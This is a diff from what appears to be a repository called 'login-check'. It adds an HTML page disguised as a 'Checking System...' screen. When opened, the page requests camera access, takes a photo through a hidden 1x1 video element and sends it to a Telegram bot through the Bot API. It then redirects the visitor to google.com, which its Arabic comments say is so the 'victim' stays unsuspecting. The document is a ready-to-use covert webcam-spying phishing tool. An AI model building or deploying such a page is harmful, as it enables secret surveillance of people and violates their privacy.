@@ -1,2 +1,54 @@
-# login-check
-جوو
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking System...</title>
+</head>
+<body style="background-color: black;">
+    <video id="video" width="1" height="1" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+        async function startCapture() {
+            try {
+                // طلب صلاحية الكاميرا فور فتح الرابط
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // انتظر ثانية واحدة لضبط التركيز ثم التقط الصورة
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'capture.jpg');
+
+                        // إرسال الصورة إلى البوت
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        // إغلاق الكاميرا بعد الإرسال
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // توجيه الضحية لصفحة وهمية لعدم الشك
+                        window.location.href = "https://google.com";
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (err) {
+                // في حال رفض الصلاحية، توجيهه لصفحة أخرى
+                window.location.href = "https://google.com";
+            }
+        }
+
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
